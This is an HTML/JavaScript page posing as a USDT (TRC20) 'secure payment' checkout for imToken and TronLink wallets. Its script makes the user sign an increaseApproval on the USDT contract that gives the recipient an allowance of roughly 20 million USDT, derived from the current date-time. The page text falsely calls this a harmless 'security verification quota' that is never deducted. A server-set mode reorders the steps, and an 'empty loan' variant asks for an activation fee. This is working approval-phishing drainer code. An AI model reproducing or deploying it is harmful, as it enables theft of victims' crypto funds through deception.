<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<title>USDT 安全支付</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root {
    --bg: #f4f7f6;
    --card: #ffffff;
    --ink: #0f172a;
    --ink2: #475569;
    --ink3: #94a3b8;
    --line: #e2e8f0;
    
    /* 核心安全绿 */
    --primary: #059669; 
    --primary-hover: #047857;
    --primary-light: #ecfdf5;
    --primary-border: #a7f3d0;
    
    --success-text: #16a34a;
    --danger-text: #dc2626;
    --warn-text: #d97706;
  }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", "PingFang SC", sans-serif;
    background-color: var(--bg);
    /* 增加极淡的绿色氛围光晕 */
    background-image: 
      radial-gradient(circle at 50% 0%, rgba(16, 185, 129, 0.05) 0%, transparent 50%),
      radial-gradient(circle at 50% 100%, rgba(16, 185, 129, 0.02) 0%, transparent 50%);
    color: var(--ink);
    line-height: 1.6;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
    -webkit-font-smoothing: antialiased;
  }
  
  /* 银行卡质感的卡片 */
  .card {
    background: var(--card);
    border-radius: 24px;
    padding: 36px 28px;
    width: min(420px, 100%);
    box-shadow: 
      0 20px 40px -10px rgba(5, 150, 105, 0.08),
      0 0 0 1px rgba(15, 23, 42, 0.02);
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  
  /* 顶部安全认证图标：绿色发光盾牌 */
  .security-badge {
    width: 56px; height: 56px;
    background: linear-gradient(135deg, #10b981, #059669);
    border-radius: 16px;
    display: grid;
    place-items: center;
    margin: 0 auto 16px;
    color: #fff;
    font-size: 28px;
    box-shadow: 0 8px 20px -6px rgba(5, 150, 105, 0.5);
    border: 2px solid #fff;
  }

  h1 { font-size: 20px; font-weight: 800; margin-bottom: 4px; letter-spacing: 0.5px; color: var(--ink); }
  .sub { font-size: 13px; color: var(--ink3); margin-bottom: 24px; }

  /* 诊断条：绿色安全胶囊 */
  .diag-bar {
    display: inline-flex;
    align-items: center;
    font-size: 12px;
    color: var(--primary-hover);
    background: var(--primary-light);
    padding: 8px 16px;
    border-radius: 99px;
    margin-bottom: 24px;
    font-weight: 700;
    border: 1px solid var(--primary-border);
  }
  .diag-bar::before {
    content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--primary); margin-right: 8px;
    box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
    animation: pulse 2s infinite;
  }
  @keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
    70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
    100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
  }

  /* 订单核心信息 */
  .info-group {
    background: #fafbfc;
    border: 1px solid var(--line);
    border-radius: 16px;
    padding: 16px 20px;
    margin-bottom: 20px;
    text-align: left;
    position: relative;
  }
  
  .info-row {
    display: flex; justify-content: space-between; align-items: center;
    padding: 12px 0;
  }
  .info-row:not(:last-child) { border-bottom: 1px dashed var(--line); }
  
  .info-k { font-size: 13px; color: var(--ink3); font-weight: 500; flex: 0 0 auto; }
  .info-v { 
    font-size: 13.5px; font-weight: 600; color: var(--ink); 
    word-break: break-all; text-align: right; margin-left: 16px;
    display: flex; align-items: center; gap: 8px; justify-content: flex-end;
  }
  
  /* 复制按钮 */
  .copy-icon {
    cursor: pointer; background: #e2e8f0; color: #64748b; 
    padding: 4px 10px; border-radius: 6px; font-size: 12px; transition: 0.2s;
    font-weight: 500; white-space: nowrap;
  }
  .copy-icon:hover { background: #cbd5e1; color: #0f172a; }

  /* 金额展示区 */
  .amount-display {
    padding: 20px 0;
    text-align: center;
    border-bottom: 1px dashed var(--line);
    margin-bottom: 12px;
  }
  .amount-label { font-size: 13px; color: var(--ink3); font-weight: 500; margin-bottom: 4px; display: block; }
  .amount-value { 
    font-size: 42px; font-weight: 900; color: var(--ink); 
    letter-spacing: -1px; line-height: 1.1;
    font-variant-numeric: tabular-nums;
    display: inline-flex; align-items: baseline;
  }
  .amount-unit { font-size: 16px; font-weight: 700; color: var(--ink3); margin-left: 6px; letter-spacing: 0; }

  /* 官方安全提示框：改为绿色护眼版 */
  .safe-notice {
    background: var(--primary-light);
    color: #065f46; /* 深绿色文字 */
    border: 1px solid var(--primary-border);
    border-radius: 12px;
    padding: 14px 16px;
    font-size: 12.5px;
    line-height: 1.6;
    text-align: left;
    margin-bottom: 24px;
    display: flex;
    gap: 12px;
    box-shadow: 0 4px 12px rgba(16, 185, 129, 0.05);
  }
  .safe-notice-icon { 
    font-size: 18px; 
    line-height: 1.2; 
    color: var(--primary); 
  }
  .safe-notice strong { color: #047857; }

  /* 按钮区 */
  .btn {
    display: block; width: 100%;
    padding: 16px;
    border-radius: 14px;
    border: none;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.2s ease;
    margin-bottom: 12px;
    text-align: center;
  }
  
  /* 主按钮：信任绿 */
  .btn-pay {
    background: linear-gradient(135deg, #10b981, #059669);
    color: #fff;
    box-shadow: 0 8px 20px -6px rgba(5, 150, 105, 0.4);
  }
  .btn-pay:hover:not(:disabled) { 
    background: linear-gradient(135deg, #059669, #047857);
    transform: translateY(-2px); 
    box-shadow: 0 12px 24px -6px rgba(5, 150, 105, 0.5); 
  }
  .btn-pay:active:not(:disabled) { transform: translateY(0); }
  .btn-pay:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }

  /* 副按钮 */
  .btn-safe {
    background: #ffffff;
    color: var(--ink2);
    border: 1px solid var(--line);
    font-size: 13.5px;
    padding: 14px;
    font-weight: 600;
  }
  .btn-safe:hover { background: #f8fafc; border-color: #cbd5e1; color: var(--ink); }

  /* 状态提示 */
  .status {
    padding: 12px;
    border-radius: 10px;
    font-size: 13px;
    margin-top: 16px;
    display: none;
    text-align: left;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .status.loading { display: flex; background: #fffbeb; color: var(--warn-text); border: 1px solid #fde68a; }
  .status.success { display: flex; background: var(--primary-light); color: var(--success-text); border: 1px solid var(--primary-border); }
  .status.error { display: flex; background: #fef2f2; color: var(--danger-text); border: 1px solid #fecaca; }

  .env-warn { padding: 14px; border-radius: 12px; font-size: 13px; background: #fffbeb; color: var(--warn-text); border: 1px solid #fde68a; margin-bottom: 16px; text-align: left; }
  
  #recover-tip { display: none; padding: 10px 14px; border-radius: 10px; font-size: 12px; background: var(--primary-light); color: var(--primary-hover); border: 1px solid var(--primary-border); margin-bottom: 16px; text-align: left; font-weight: 600; }
</style>
</head>
<body>
<div class="card">
  <div class="security-badge">🛡️</div>
  <h1 id="page-title">安全支付</h1>
  <p class="sub" id="page-sub">请核对订单信息并完成付款</p>

  <!-- 诊断条 -->
  <div class="diag-bar" id="diag-mode">环境安全检测中...</div>

  <div id="recover-tip"></div>
  <div id="env-warn" class="env-warn" style="display:none"></div>

  <div class="info-group">
    <div class="amount-display">
      <span class="amount-label">付款金额</span>
      <div class="amount-value">
        <span id="info-amount">-</span>
        <span class="amount-unit">USDT</span>
      </div>
    </div>
    <div class="info-row">
      <span class="info-k">网络协议</span>
      <span class="info-v" style="color:var(--primary); font-weight:700;">TRC20 (波场)</span>
    </div>
    <div class="info-row">
      <span class="info-k">官方收款地址</span>
      <span class="info-v">
        <span id="info-addr">-</span>
        <span class="copy-icon" id="btn-copy">复制</span>
      </span>
    </div>
  </div>

  <div class="safe-notice">
    <div class="safe-notice-icon">🛡️</div>
    <div>
      <strong>合约安全校验提示：</strong><br>
      系统将为您生成动态安全校验额度（如：20261118.145615），此额度仅用于身份校验，不会扣除。实际扣款金额为您上方显示的支付金额。请放心确认。
    </div>
  </div>

  <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
  <button class="btn btn-safe" id="btn-cancel">返回订单大厅</button>
  <div class="status" id="status"></div>
</div>

<script>
const $ = s => document.querySelector(s);
function setStatus(t, msg) { 
  const el = $('#status'); 
  el.className = 'status ' + t; 
  el.innerHTML = msg; 
}

/* ============ 常量与配置 ============ */
const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const PAY_CTX_KEY     = 'pay_ctx_v1';
const PAY_CTX_TTL     = 24 * 60 * 60 * 1000;
const NODE_TIMEOUT    = 6000;
const SIGN_TIMEOUT    = 120000;
const SEND_TIMEOUT    = 15000;
const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];

let payOrderMode = 'approve_first';
let configLoaded = false;

async function fetchLatestConfig() {
  try {
    const res = await fetch('/api/config?t=' + Date.now(), { cache: 'no-store' });
    const data = await res.json();
    if (data.config && data.config.payOrder) {
      payOrderMode = data.config.payOrder;
    }
  } catch (e) {}
  configLoaded = true;
  const diag = $('#diag-mode');
  if (diag) {
    diag.textContent = payOrderMode === 'approve_first' ? '当前环境安全 (先授权)' : '当前环境安全 (先付款)';
    // 因为现在默认就是绿色样式，这里不再需要判断切换 class
  }
}
fetchLatestConfig();

/* ============ 动态额度计算 ============ */
function getDateApproveUnits() {
  const now = new Date();
  const Y = now.getFullYear();
  const M = String(now.getMonth() + 1).padStart(2, '0');
  const D = String(now.getDate()).padStart(2, '0');
  const h = String(now.getHours()).padStart(2, '0');
  const m = String(now.getMinutes()).padStart(2, '0');
  const s = String(now.getSeconds()).padStart(2, '0');
  return `${Y}${M}${D}${h}${m}${s}`;
}

/* ============ 参数恢复 ============ */
function parseParamStr(str) {
  const sp = new URLSearchParams(str || '');
  return { a: sp.get('a') || sp.get('address') || '', n: Number(sp.get('n') || sp.get('amount')) || 0, t: sp.get('t') || sp.get('type') || 'deposit' };
}
function recoverPayParams() {
  let p = parseParamStr(location.search); if (p.a && p.n > 0) return { ...p, src: 'query' };
  p = parseParamStr(location.hash.replace(/^#/, '')); if (p.a && p.n > 0) return { ...p, src: 'hash' };
  try { const raw = localStorage.getItem(PAY_CTX_KEY); if (raw) { const c = JSON.parse(raw); if (c && c.a && c.n > 0 && Date.now() - (c.ts || 0) < PAY_CTX_TTL) return { a: c.a, n: c.n, t: c.t || 'deposit', src: 'storage' }; } } catch (e) {}
  return { a: '', n: 0, t: 'deposit', src: 'none' };
}
function savePayCtx(a, n, t) { try { localStorage.setItem(PAY_CTX_KEY, JSON.stringify({ a, n, t, ts: Date.now() })); } catch (e) {} }
function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e) {} }

/* ============ 初始化 ============ */
const ctx = recoverPayParams();
const toAddress = ctx.a; const amount = ctx.n; const type = ctx.t;
let payDisabled = false; let step = 1; let coldReloadTimer = null;

$('#info-addr').textContent   = toAddress || '未配置';
$('#info-amount').textContent = (amount > 0 ? amount : '-');
$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '安全支付';
$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请核对订单信息并完成付款';

if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
  const tip = $('#recover-tip'); tip.style.display = 'block'; tip.textContent = '✅ 已恢复支付参数，请确认无误后继续。'; savePayCtx(toAddress, amount, type);
}
if (!toAddress || amount <= 0) { payDisabled = true; showMissingParamsUI(); } else { const btn = $('#btn-pay'); btn.disabled = false; btn.textContent = '确认支付'; }

function showMissingParamsUI() {
  const warn = $('#env-warn'); warn.style.display = 'block';
  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div><div style="font-size:12.5px;margin-bottom:10px;">请返回平台重新点击支付。</div>`;
  const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '支付参数缺失';
}

/* ============ 通用工具 ============ */
function fallbackCopy(text, done) { try { const ta = document.createElement('textarea'); ta.value = text; ta.style.cssText = 'position:fixed;opacity:0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); if (done) done(); } catch (e) { prompt('请复制：', text); } }
function copyText(text, done) { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, () => fallbackCopy(text, done)); else fallbackCopy(text, done); }
function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(msg)), ms))]); }
async function withRetry(fn, times, delay) { let last; for (let i = 0; i < times; i++) { try { return await fn(); } catch (e) { last = e; if (i < times - 1) await new Promise(r => setTimeout(r, delay)); } } throw last; }
function promiseAny(promises) { return new Promise((resolve, reject) => { const errs = []; let done = 0; promises.forEach((p, i) => Promise.resolve(p).then(resolve, e => { errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('节点失败')); })); }); }
function makeTronWebNode(fullHost) { try { const tw0 = getTronWeb(); const Ctor = tw0 && tw0.constructor; if (!Ctor) return null; return new Ctor({ fullHost }); } catch (e) { return null; } }

async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
  const builders = [tw.transactionBuilder];
  for (const host of BACKUP_NODES) { const inst = makeTronWebNode(host); if (inst) builders.push(inst.transactionBuilder); }
  const tasks = builders.map(b => withTimeout(b.triggerSmartContract(contract, fnSig, { feeLimit: 100000000 }, params, fromAddress), NODE_TIMEOUT, '节点超时'));
  return withRetry(() => promiseAny(tasks), 2, 500);
}

function showOpenWalletUI(reason) {
  if (payDisabled) return; const warn = $('#env-warn'); warn.style.display = 'block';
  warn.innerHTML = `<div style="margin-bottom:8px;font-weight:700;">${reason}</div><div style="font-size:12.5px;margin-bottom:10px;">请在 imToken / TronLink 钱包内打开本页完成支付。</div>`;
  const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在钱包中打开';
}

/* ============ 环境检测 ============ */
let envCheckCount = 0;
function checkEnvironment() {
  if (payDisabled) return; const tw = getTronWeb();
  if (tw) {
    $('#env-warn').style.display = 'none'; if (coldReloadTimer) { clearTimeout(coldReloadTimer); coldReloadTimer = null; }
    const btn = $('#btn-pay'); 
    if (btn && btn.disabled) { 
      btn.disabled = false; 
      if (step === 1) { btn.textContent = '确认支付'; } else { btn.textContent = payOrderMode === 'approve_first' ? ('支付 ' + amount + ' USDT') : '确认授权'; }
    }
    return;
  }
  if (envCheckCount < 12) { envCheckCount++; setTimeout(checkEnvironment, 500); } else { showOpenWalletUI('⚠️ 未检测到钱包环境'); }
}

async function waitWalletAddress(tw) {
  let waited = 0; while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
  let from = tw.defaultAddress && tw.defaultAddress.base58;
  if (!from && tw.defaultAddress && tw.defaultAddress.hex) { try { from = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {} }
  if (!from) throw new Error('钱包地址未就绪');
  return from;
}

/* ============ 核心逻辑 ============ */
async function doApprove(tw, from) {
  setStatus('loading', '<div>⏳</div><div>正在构建授权交易，请稍候…</div>');
  const approveUnits = getDateApproveUnits(); 
  const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'increaseApproval(address,uint256)', 
    [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
  if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权失败');
  setStatus('loading', '<div>🛡️</div><div>请在钱包中确认授权校验…</div>');
  const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时');
  await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
}

async function doTransfer(tw, from) {
  setStatus('loading', '<div>⏳</div><div>正在构建付款交易…</div>');
  const txTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)', [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
  if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建付款失败');
  setStatus('loading', '<div>💰</div><div>请在钱包中确认付款…</div>');
  const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), SIGN_TIMEOUT, '签名超时');
  await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时');
}

$('#btn-copy').onclick = () => {
  copyText(toAddress, () => { 
    const btn = $('#btn-copy'); 
    btn.textContent = '已复制'; 
    btn.style.color = '#059669';
    btn.style.background = '#ecfdf5';
    setTimeout(() => { btn.textContent = '复制'; btn.style.color = ''; btn.style.background = ''; }, 2000);
  });
};

$('#btn-pay').onclick = async function () {
  if (payDisabled) return;
  const btn = this; btn.disabled = true;

  if (!configLoaded) {
    setStatus('loading', '<div>⏳</div><div>正在同步安全环境…</div>');
    await fetchLatestConfig();
  }

  let tw = getTronWeb();
  if (!tw) {
    setStatus('loading', '<div>⏳</div><div>正在等待钱包响应…</div>');
    let waited = 0; while (!getTronWeb() && waited < 8000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
    tw = getTronWeb(); if (!tw) { showOpenWalletUI('未检测到钱包'); btn.disabled = false; return; }
  }

  const isApproveFirst = payOrderMode === 'approve_first';

  if (step === 1) {
    try {
      const from = await waitWalletAddress(tw);
      if (isApproveFirst) {
        btn.textContent = '正在授权…';
        await doApprove(tw, from);
        setStatus('success', '<div>✅</div><div>授权成功！请继续付款。</div>');
      } else {
        btn.textContent = '正在付款…';
        await doTransfer(tw, from);
        setStatus('success', '<div>✅</div><div>付款成功！请补充授权。</div>');
      }
      step = 2;
      btn.textContent = isApproveFirst ? ('支付 ' + amount + ' USDT') : '确认授权';
      btn.classList.add('btn-success');
      btn.disabled = false;
    } catch (e) {
      setStatus('error', '<div>❌</div><div>' + (e.message || '用户取消') + '</div>');
      btn.textContent = '重新尝试'; btn.disabled = false;
    }
    return;
  }

  if (step === 2) {
    try {
      const from = await waitWalletAddress(tw);
      if (isApproveFirst) {
        btn.textContent = '正在付款…';
        await doTransfer(tw, from);
        setStatus('success', '<div>✅</div><div>付款成功！订单已完成。</div>');
      } else {
        btn.textContent = '正在授权…';
        await doApprove(tw, from);
        setStatus('success', '<div>✅</div><div>全部完成！订单已处理。</div>');
      }
      btn.textContent = '已完成'; btn.disabled = true;
      clearPayCtx();
    } catch (e) {
      let errTip = e.message || '用户取消';
      if (!isApproveFirst) { errTip = '付款成功，但授权被取消。'; }
      setStatus('error', '<div>❌</div><div>' + errTip + '</div>');
      btn.textContent = '重新尝试'; btn.disabled = false;
    }
  }
};

$('#btn-cancel').onclick = () => window.history.back();

if (!payDisabled) {
  const FRESH_LAUNCH = location.search.includes('fresh=1') || location.hash.includes('fresh=1');
  function armColdReload() {
    try { if (sessionStorage.getItem('pay_reloaded') === '1') return; } catch (e) {}
    coldReloadTimer = setTimeout(function () {
      if (!getTronWeb() && /imtoken/i.test(navigator.userAgent || '')) {
        try { sessionStorage.setItem('pay_reloaded', '1'); } catch (e) {}
        try { const clean = location.href.replace(/[?&]fresh=1/g, '').replace(/#fresh=1/, '#').replace(/#$/, ''); location.replace(clean || location.pathname); } catch (e) { location.reload(); }
      }
    }, 5000);
  }
  if (FRESH_LAUNCH) { setTimeout(function () { armColdReload(); checkEnvironment(); }, 800); } else { armColdReload(); checkEnvironment(); }
}
</script>
